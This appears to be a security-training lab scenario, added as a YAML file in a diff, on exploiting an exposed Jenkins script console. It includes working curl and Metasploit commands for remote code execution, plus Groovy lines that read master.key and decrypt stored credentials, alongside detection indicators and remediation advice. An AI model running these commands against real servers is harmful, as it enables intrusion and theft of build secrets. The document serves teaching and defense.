@@ -1,0 +1,108 @@
+# Category: CI/CD Security
+name: "Jenkins Misconfiguration – RCE via Script Console"
+id: "cicd-jenkins-rce-001"
+category: "cicd_security"
+subcategory: "jenkins"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit a publicly accessible Jenkins instance with script console access
+  to execute Groovy scripts, achieving remote code execution on the Jenkins
+  master. This often occurs when Jenkins is exposed to the internet without
+  authentication or with default credentials.
+
+learning_objectives:
+  - Understand Jenkins architecture and script console
+  - Enumerate Jenkins endpoint for vulnerabilities
+  - Execute Groovy script to run system commands
+  - Pivot to access credentials and build secrets
+
+tools:
+  - curl
+  - Groovy scripts
+  - Metasploit (jenkins_script_console module)
+  - Burp Suite
+
+prerequisites:
+  - Jenkins instance reachable (e.g., on port 8080)
+  - No authentication or weak credentials
+  - Access to /script or /scriptText
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify Jenkins version and endpoints"
+    commands:
+      - "# Check if Jenkins is accessible"
+      - "curl -I http://<JENKINS_IP>:8080"
+      - "# Look for /script or /scriptText endpoints"
+      - "# Try default credentials (admin/admin, etc.)"
+    expected_output: "Jenkins login page or script console accessible"
+    detection: "Web logs with suspicious script access"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Execute Groovy script to run commands"
+    commands:
+      - "# Use curl to post Groovy script"
+      - "curl -X POST http://<JENKINS_IP>:8080/scriptText --data-urlencode 'script=println "id".execute().text'"
+      - "# If Jenkins is unauthenticated, this works"
+      - "# Or use Metasploit"
+      - "use exploit/multi/http/jenkins_script_console"
+      - "set RHOSTS <JENKINS_IP>"
+      - "run"
+    expected_output: "Command output (e.g., uid=jenkins)"
+    detection: "Execution of `System.setProperty` etc.; CPU spikes"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Dump credentials from Jenkins"
+    commands:
+      - "# Groovy script to read secrets.xml"
+      - "def secret = new File('/var/lib/jenkins/secrets/master.key').text"
+      - "# Or decrypt stored passwords"
+      - "println hudson.util.Secret.decrypt('encrypted_value')"
+    expected_output: "Credentials for other systems (GitHub, AWS, etc.)"
+    detection: "Sensitive file access by Jenkins process"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "CIS Jenkins Benchmark"
+    control: "2.1"
+    description: "Enable security; use strong authentication"
+
+detection:
+  network_indicators:
+    - "Requests to /scriptText from non‑trusted IPs"
+  log_indicators:
+    - "Jenkins audit log showing script execution"
+    - "Command execution in system logs"
+  endpoint_indicators:
+    - "Groovy scripts in temp directory"
+
+remediation:
+  immediate:
+    - "Set up authentication for Jenkins"
+    - "Restrict access to /script and /scriptText"
+    - "Remove default admin account"
+  long_term:
+    - "Place Jenkins behind VPN or firewall"
+    - "Regularly update Jenkins and plugins"
+
+variables:
+  jenkins_ip: "192.168.1.100"
+  jenkins_port: "8080"
+
+assessment_questions:
+  - "What Groovy command can execute system commands in Jenkins?"
+  - "Why is the Script Console dangerous?"
+  - "How can you limit script console access to specific IPs?"
+
+references:
+  - url: "https://www.jenkins.io/doc/book/security/"
+    title: "Jenkins Security Documentation"
+  - url: "https://www.exploit-db.com/exploits/48112"
+    title: "Jenkins Script Console RCE Exploit"
